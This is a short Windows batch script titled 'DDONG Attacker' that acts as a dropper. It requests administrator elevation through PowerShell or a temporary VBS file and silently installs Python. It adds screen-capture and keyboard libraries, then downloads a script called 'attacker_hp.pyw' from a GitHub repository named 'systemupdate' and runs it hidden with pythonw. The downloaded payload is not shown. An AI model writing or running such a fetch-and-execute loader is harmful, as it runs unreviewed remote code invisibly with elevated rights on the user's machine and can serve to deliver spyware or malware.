@echo off
set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%PATH%

title DDONG Attacker

net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [안내] 관리자 권한 필요. 자동 승격 시도...
    powershell -Command "Start-Process '%~s0' -Verb RunAs" >nul 2>&1
    if %errorlevel% NEQ 0 (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
    )
    exit /B
)
pushd "%~dp0"

where python >nul 2>&1 || where py >nul 2>&1 || (curl -o pyinst.exe https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe && start /wait pyinst.exe /quiet InstallAllUsers=1 PrependPath=1 && del pyinst.exe)
for %%d in ("C:\Program Files\Python311" "%LocalAppData%\Programs\Python\Python311") do if exist %%d\python.exe set PATH=%%d\Scripts\;%%d\;%PATH%

python -m pip install --upgrade pip --quiet
python -m pip install numpy pillow mss keyboard pywin32 --quiet

curl -L -o "%~dp0attacker_hp.pyw" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/attacker_hp.pyw?t=%RANDOM%"

for /f "tokens=*" %%i in ('python -c "import os, sys; print(os.path.join(os.path.dirname(sys.executable), 'pythonw.exe'))"') do set PW=%%i
start "" "%PW%" "%~dp0attacker_hp.pyw"

exit
